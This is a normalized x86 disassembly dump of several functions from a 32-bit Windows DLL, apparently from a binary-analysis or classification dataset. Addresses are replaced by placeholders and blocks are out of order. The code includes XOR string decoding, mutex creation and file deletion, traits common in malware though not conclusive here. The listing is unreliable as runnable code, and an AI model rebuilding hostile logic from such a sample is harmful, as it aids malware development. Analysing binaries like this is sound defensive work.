lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x138 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
mov eax 0x4
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0xe3
call sub_10013830
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x130 ]
lea ecx [ ebp - 0x120 ]
call sub_1005a590
test eax eax
je r-xdata
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
mov eax 0x5
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x130 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
mov eax 0x6
jmp r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
lea edx [ ebp - 0xd8 ]
mov eax 0x154
call sub_10013830
mov eax [ ebp - 0x144 ]
push eax
lea edx [ ebp - 0x140 ]
lea ecx [ ebp - 0xd8 ]
call sub_1005a590
test eax eax
jne r-xdata
lea esi [ ebp - 0x140 ]
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x140 ]
mov edx [ ecx ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
lea esi [ ebp - 0x140 ]
mov [ eax ] dx
call sub_10005940
lea esi [ ebp - 0x130 ]
call sub_10005940
lea esi [ ebp - 0x138 ]
call sub_10005940
lea esi [ ebp - 0x128 ]
call sub_10005940
cmp edi ebx
jl r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov eax 0x7
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10026d80
cmp eax edi
je r-xdata
retn
push ebx
push esi
lea esi [ eax + 0x18 ]
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x10
jb r-xdata
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add esi 0x3c
lea ecx [ esi - 0x18 ]
cmp ecx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_1006591f
add esp 0x4
pop esi
pop ebx
sub_10026dc0
push ebp
mov ebp esp
push ecx
cmp [ edi ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ LocalFree@IAT ]
push esi
mov edx [ edi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push eax
call ebx
sub_10026e50
push ebp
mov ebp esp
push 0xffffffff
push sub_10082071
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] bl
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x54 ] ecx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov esi 0x7
xor edx edx
mov [ edi + 0x40 ] esi
mov [ edi + 0x3c ] ebx
mov [ edi + 0x2c ] dx
xor ecx ecx
mov [ edi + 0x5c ] esi
mov [ edi + 0x58 ] ebx
mov [ edi + 0x48 ] cx
mov [ edi + 0x78 ] esi
mov [ edi + 0x74 ] ebx
mov [ edi + 0x64 ] dx
push 0xffffffff
lea ecx [ edi + 0x80 ]
mov [ ebp - 0x4 ] 0x3
push ebx
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push eax
mov [ ecx ] dx
call sub_10019180
mov [ edi + 0xb4 ] 0xf
mov [ edi + 0xb0 ] ebx
mov [ edi + 0xa0 ] bl
mov [ edi + 0xbc ] ebx
mov [ edi + 0xc0 ] 0x3
mov [ edi + 0xc4 ] ebx
mov [ edi + 0xc8 ] ebx
mov [ edi + 0xcc ] ebx
mov [ ebp - 0x4 ] 0x6
push 0x18
mov [ edi + 0xdc ] ebx
call sub_10055606
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4c ] ebx
call sub_10008757
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_1000bd19
int3
mov [ edi + 0xd8 ] eax
mov [ eax ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x8 ] eax
mov eax [ edi + 0xd8 ]
mov [ eax + 0x14 ] 0x1
mov ecx [ edi + 0xd8 ]
mov [ ecx + 0x15 ] 0x1
xor edx edx
mov [ edi + 0xfc ] esi
mov [ edi + 0xf8 ] ebx
mov [ edi + 0xe8 ] dx
fldz
fst [ edi + 0x114 ]
mov [ edi + 0x104 ] ebx
fstp [ edi + 0x118 ]
mov [ edi + 0x108 ] 0x1
mov [ edi + 0x10c ] ebx
mov [ edi + 0x110 ] ebx
xor eax eax
mov [ edi + 0x130 ] esi
mov [ edi + 0x12c ] ebx
mov [ edi + 0x11c ] ax
mov [ ebp - 0x4 ] 0x9
mov [ ebp - 0x4c ] ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x50 ]
lea esi [ ebp - 0x4c ]
call sub_1006c980
cmp eax ebx
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x50 ]
xor ecx ecx
push edx
mov [ ebp - 0x2c ] cx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
call sub_100531b0
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x1c ]
push eax
lea esi [ ebp - 0x48 ]
call sub_10040ea0
add esp 0x4
push eax
lea ecx [ edi + 0xa0 ]
mov [ ebp - 0x4 ] 0xb
call sub_1000adb0
mov [ ebp - 0x4 ] 0xa
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x2c ]
lea edx [ edi + 0xe4 ]
push edx
call sub_1003b1ca
add esp 0x4
lea eax [ edi + 0x14 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov edx [ ebp - 0x58 ]
cmp edx ebx
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
push ebx
push ebx
push ebx
call [ CreateMutexW@IAT ]
mov [ edi + 0x110 ] eax
cmp eax ebx
jne r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov [ edi ] 0x1
jb r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
mov ecx [ ebp - 0x2c ]
push ecx
jmp r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x2c ]
call sub_100531b0
mov edx [ ebp - 0x5c ]
cmp edx ebx
je r-xdata
call sub_1006591f
add esp 0x4
mov eax edx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ edi + 0x48 ]
call sub_100531b0
mov edx [ ebp - 0x54 ]
cmp edx ebx
je r-xdata
lea eax [ edi + 0x64 ]
push eax
call sub_1005eea0
sub_10027136
push 0x10
push r--data
call sub_10079bf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_10079c35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x16
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1002f7c4
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_1001d849
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10027224
mov eax [ ebp - 0x1c ]
sub_1002722c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10003a04
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10027260
push ebp
mov ebp esp
push 0xffffffff
push sub_10082921
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] edi
push 0x7
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ ebp - 0x34 ] esi
mov [ esi ] ax
call sub_100531b0
mov [ ebp - 0x4 ] edi
mov edi [ ebx + 0xc4 ]
mov [ ebp - 0x30 ] 0x1
cmp edi [ ebx + 0xc8 ]
je r-xdata
push 0x8
push r--data
mov ecx esi
call sub_10025720
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add edi 0x4
cmp edi [ ebx + 0xc8 ]
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ edi ]
call sub_10033200
push 0xffffffff
push 0x0
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10043930
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
sub_10027339
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_10002a14
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_100273c0
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx 0x3
mov [ ebp - 0xb4 ] eax
xor eax eax
push ebx
mov [ ebp - 0xb8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x14 ] dx
push esi
mov [ ebp - 0xac ] eax
mov [ ebp - 0xb0 ] eax
lea edx [ eax + 0x1 ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x37
and esi 0xff
mov [ ebp + eax * 2 - 0x38 ] si
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x24 ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xac ]
push eax
push r--data
lea eax [ ebp - 0x38 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xac ]
jns r-xdata
lea edx [ ebp - 0xa4 ]
mov [ ebp - 0xa4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x44
call sub_100050e0
mov ebx [ ebp - 0xb8 ]
mov esi [ ebx + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x113
call sub_100050e0
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
mov eax 0x37
call sub_100050e0
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xa4 ]
push ecx
push edi
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xa5
jmp r-xdata
call sub_100050e0
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0xa8 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xa8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xa8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x12c
jmp r-xdata
mov eax [ ebp - 0xac ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xa4 ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x97
call sub_100050e0
mov esi [ ebp - 0xa8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xa8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xb4 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xb0 ]
push ecx
mov ecx [ ebp - 0xac ]
push ecx
push eax
call edx
mov eax [ ebp - 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xbe
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x11d
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
test eax eax
je r-xdata
sub_10027640
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100838d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x310
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x308 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x320 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor eax eax
mov [ esp + 0x34 ] ebx
cmp [ ebx + 0x8 ] eax
jne r-xdata
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x328 ] eax
mov esi [ ebx + 0xb4 ]
mov ecx [ ebx + 0xb8 ]
lea edi [ ebx + 0xb4 ]
mov [ esp + 0x18 ] eax
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ esp + 0x14 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax edi
mov ecx ebx
lea esi [ esp + 0x3c ]
call sub_10035b70
xor eax eax
mov [ esp + 0x328 ] 0x2
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] eax
xor ebx ebx
mov ecx [ esp + 0x320 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x308 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
inc eax
cmp eax 0x25
jb r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
lea edx [ esp + 0xb4 ]
push edx
lea ecx [ esp + 0xb4 ]
push ecx
call sub_10015a50
add esp 0x8
lea ecx [ esp + 0x94 ]
lea edi [ esp + 0x20 ]
call sub_10043a70
cmp [ esp + 0xa8 ] 0x8
jb r-xdata
mov eax [ eax ]
xor eax eax
nop
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
lea edi [ esp + 0x24 ]
lea esi [ esp + 0x40 ]
call sub_10041440
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov esi [ edi ]
mov ecx [ edi + 0x4 ]
inc [ esp + 0x18 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add ebx 0x1c
cmp [ esp + 0x18 ] eax
jb r-xdata
mov edx [ esp + 0x94 ]
push edx
call sub_1006591f
add esp 0x4
inc eax
cmp eax 0x39
jb r-xdata
lea eax [ esp + 0x3c ]
mov [ esp + 0x328 ] 0x0
call sub_100542e0
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov eax [ esp + 0x38 ]
cmp eax 0x1e84800
jge r-xdata
xor eax eax
xor ecx ecx
mov [ esp + 0xa8 ] 0x7
mov [ esp + 0xa4 ] eax
mov [ esp + 0x94 ] cx
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
push 0xffffffff
push eax
add esi ebx
push esi
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x334 ] 0x1
call sub_10019180
xor eax eax
mov [ esp + 0xb0 ] eax
mov [ esp + 0xb4 ] eax
mov eax [ edi ]
add eax ebx
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov ebx [ esp + 0x34 ]
mov eax 0x2
jmp r-xdata
mov edi [ esp + 0x24 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
lea edx [ esp + 0x18 ]
mov eax 0xb5
call sub_10013830
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x124 ]
mov [ esp + 0x48 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push eax
mov eax [ esp + 0x24 ]
push eax
push ecx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x1c ]
push ecx
push edx
lea eax [ esp + 0x114 ]
call sub_10031770
add esp 0x8
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x1c ]
mov ebx [ HeapFree@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x3c ]
mov [ esp + 0x328 ] 0x0
call sub_100542e0
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov esi [ esp + 0x20 ]
cmp esi [ esp + 0x24 ]
je r-xdata
push eax
push 0x0
call ebx
push eax
call edi
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
mov eax 0x3
jmp r-xdata
mov edi [ esp + 0x24 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax [ esp + 0x14 ]
mov esi [ eax ]
mov edi [ esp + 0x34 ]
mov ebx [ DeleteFileW@IAT ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x24 ]
jne r-xdata
mov eax [ esp + 0x14 ]
mov esi [ eax ]
mov ebx [ esp + 0x34 ]
cmp esi [ ebx + 0xb8 ]
je r-xdata
mov edx [ esi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
add esi 0x24
cmp esi edi
jne r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
cmp eax ecx
je r-xdata
mov edi [ DeleteFileW@IAT ]
cmp [ esp + 0x30 ] 0x0
je r-xdata
mov edx [ esp + 0x30 ]
push edx
push ecx
call sub_10047480
mov ebx eax
mov eax [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
lea esp [ esp ]
mov edx [ esp + 0x30 ]
push edx
push ecx
call sub_10047480
mov ebx eax
mov eax [ esp + 0x1c ]
mov edi [ eax + 0x4 ]
add esp 0x8
mov esi ebx
cmp ebx edi
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ esp + 0x10c ]
push edx
call sub_10018ea0
test eax eax
lea eax [ esp + 0x10c ]
push eax
je r-xdata
xor eax eax
lea ebx [ ebx ]
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
mov ebx [ DeleteFileW@IAT ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
inc eax
cmp eax 0x14
jb r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esp + 0x14 ]
push eax
call edi
add esi 0x1c
cmp esi [ ebx + 0xb8 ]
jne r-xdata
call ebx
xor eax eax
call ebx
xor eax eax
nop
inc eax
cmp eax 0x3b
jb r-xdata
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
inc eax
cmp eax 0x14
jb r-xdata
inc eax
cmp eax 0x3b
jb r-xdata
mov [ esp + 0x328 ] 0x0
mov eax [ esp + 0x3c ]
mov ebx [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x48 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov esi [ esp + 0x90 ]
test esi esi
je r-xdata
push eax
call ebx
mov ebx [ esp + 0x20 ]
test ebx ebx
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ esp + 0x20 ]
test esi esi
je r-xdata
mov ecx [ esi ]
mov edi [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax 0x4
jmp r-xdata
mov edi [ esp + 0x24 ]
mov esi ebx
cmp ebx edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
xor eax eax
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax 0x5
jmp r-xdata
mov edi [ esp + 0x24 ]
cmp esi edi
je r-xdata
push esi
call ebx
mov esi edi
test edi edi
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push ebx
call sub_1006591f
add esp 0x4
lea ecx [ ecx ]
mov edx [ esp + 0x20 ]
push edx
call sub_1006591f
add esp 0x4
mov ebx 0x7
mov edx [ esp + 0x20 ]
push edx
call sub_1006591f
add esp 0x4
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ esi + 0x14 ] ebx
